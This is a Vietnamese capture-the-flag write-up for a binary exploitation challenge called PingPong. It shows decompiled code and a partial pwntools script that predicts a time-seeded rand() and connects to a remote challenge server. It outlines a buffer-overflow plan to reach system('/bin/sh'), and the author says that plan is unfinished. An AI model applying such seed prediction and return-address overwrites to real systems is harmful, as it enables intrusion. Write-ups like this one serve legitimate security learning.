# PingPong---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài PingPong của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 14/12/2025

## 1. Mục tiêu cần làm
Khi đọc code bài này ta thấy rằng chúng ta phải vượt qua được `Startgame` thì chúng ta mới có thể thực thi bước tiếp theo.

```C
__int64 Startgame()
{
  unsigned int v0; // eax
  char v2[44]; // [rsp+Fh] [rbp-31h] BYREF
  char v3; // [rsp+3Bh] [rbp-5h]
  unsigned int v4; // [rsp+3Ch] [rbp-4h]

  v4 = 0;
  v0 = time(0LL);
  srand(v0);
  puts("Game start... ");
  do
  {
    v3 = rand() % 2;
    do
    {
      printf("hit left = 'l', hit right ='r': ");
      __isoc99_scanf("%c%*c", v2);
    }
    while ( v2[0] != 108 && v2[0] != 114 );
    if ( (v3 || v2[0] != 108) && (v3 != 1 || v2[0] != 114) )
    {
      printf("Missed! The game is over. Total hits: %d\n", v4);
      exit(0);
    }
    printf("Good hit! Total hits: %d\n", ++v4);
  }
  while ( (int)v4 <= 19 );
  return getname();
}
```

Bài này khá là giống bài **Cat Jump** mà mình từng giải ( https://github.com/Cunhotayto/Cat-Jump---Write-up-----DreamHack ).

Sau khi vượt qua được `Startgame` thì chúng ta sẽ được nhảy vào `getname`.

```C
int getname()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Can I get your name to put it on the scoreboard.");
  printf("Your Name is: ");
  __isoc99_scanf("%8s", name);
  snprintf(cmd, 0x40uLL, "echo \"%s\" > /tmp/pingpong_scoreboard", name);
  puts("Feedback for the game:");
  read(0, buf, 0x40uLL);
  if ( strlen(buf) <= 0x20 )
    return puts("Thanks for your feedback!");
  else
    return puts("Buffer Overflow detected!");
}
```

Tại đây chúng ta có thể ghi vào biến `name` mà ở hàm `printff` sẽ gọi `system(name)`. Vậy mục tiêu là nhập vào `name` là `/bin/sh` sau đó nhảy được tới `printff`.

## 2. Cách thực thi
Vì ở bài **Cat Jump** mình đã nói chi tiết về `srand()` + cách seed hoạt động nên ta sẽ viết được đoạn code sau.

```Python
    p = remote('67.223.119.69', 5005)

    # 1. BYPASS GAME
    seed = int(time.time())
    libc.srand(seed)
    try:
        for i in range(20):
            r_val = libc.rand()
            v3 = r_val % 2 
            choice = b'l' if v3 == 0 else b'r'
            p.sendline(choice)
            p.recvuntil(b': ')

```

Khi ta nhảy qua `getname` thì chúng ta phải nhập `name` và `buf`. Tại `name` ta sẽ nhập `/bin/sh`. Còn `buf` thì ta sẽ nhập sao cho đè RIP bằng địa chỉ `printff`. Nhưng bài này có PIE nên ta không thể nhập thẳng địa chỉ của `printff`.

Vì `printff` và `getname` nằm cùng 1 *trang* nên chúng ta có thể đè các byte thấp của nó bằng byte thấp của `printff`. Nhưng bài này có `SHSKT` nên hiện tại mình vẫn chưa tìm được hướng giải quyết nào. Có lẽ trong tương lai gần nếu giải được mình sẽ update thêm cho các bạn. Xin loi vi da den 🐧.


